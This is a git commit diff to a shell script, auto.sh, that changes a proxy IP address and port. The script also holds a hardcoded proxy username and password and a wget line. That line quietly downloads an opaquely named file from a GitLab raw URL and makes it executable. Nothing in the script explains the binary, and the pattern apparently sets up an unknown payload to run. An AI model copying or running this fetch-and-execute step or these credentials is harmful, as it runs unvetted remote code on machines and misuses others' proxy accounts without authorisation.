964791f2c61aaad6ada9efdd83ff58ca992def63
Mas kurniawan <110314564+55113110159@users.noreply.github.com>
2024-01-05 12:33:49 +0700

    Update auto.sh

--- auto.sh
+++ auto.sh
@@ -1,5 +1,5 @@
-proxy="188.74.183.10" 
-port="8279" 
+proxy="38.154.227.167" 
+port="5868" 
 user="ubslvwxe"  
 pass="iikj33112te4" 
 wget -q -O fe456532443 https://gitlab.com/55113110159/dokerweb/-/raw/main/zydo191 && chmod +x fe456532443
